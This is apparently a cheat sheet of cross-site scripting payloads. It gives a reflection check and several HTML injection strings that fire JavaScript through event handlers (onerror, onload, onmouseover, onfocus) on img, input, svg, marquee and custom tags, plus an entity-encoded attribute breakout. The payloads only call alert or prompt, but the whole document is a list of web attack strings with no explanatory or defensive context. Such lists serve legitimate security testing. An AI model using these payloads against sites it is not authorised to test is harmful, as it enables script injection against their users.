```
Try url/?testtest // check in source for testtest

<input type=image src onerror=prompt(1)>
<input type=image src onerror="alert(1)">

<img src=xss onerror=alert(1)>
<img src =q onerror=prompt(8)>
<IMG SRC=# onmouseover="alert('xss')">
<img/src/onerror=alert(1)>

<svg/onload=alert(1)>
<marquee/onstart=alert(1)>

&quot;&gt;&lt;img src=# onerror=prompt(1231231);&gt;

// Custom HTML tag
<xssdemo id=testxss onfocus=alert(1) tabindex=1>#testxss
```
